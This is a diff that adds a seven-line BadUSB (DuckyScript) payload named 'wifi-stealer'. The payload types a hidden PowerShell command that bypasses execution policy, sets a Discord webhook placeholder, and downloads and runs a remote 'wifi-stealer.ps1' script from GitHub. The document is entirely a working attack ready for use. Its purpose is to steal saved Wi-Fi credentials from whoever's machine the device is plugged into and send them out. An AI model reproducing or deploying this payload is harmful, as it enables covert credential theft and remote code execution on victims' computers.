@@ -1,0 +1,7 @@
+REM Payload for wifi-stealer
+REM Credits to beigeworm
+REM Time to execute: 7.6
+GUI r
+DELAY 500
+STRING powershell -w h -ep bypass $dc='DISCORD_WEBHOOK_HERE';irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/wifi-stealer/wifi-stealer.ps1 | iex
+ENTER
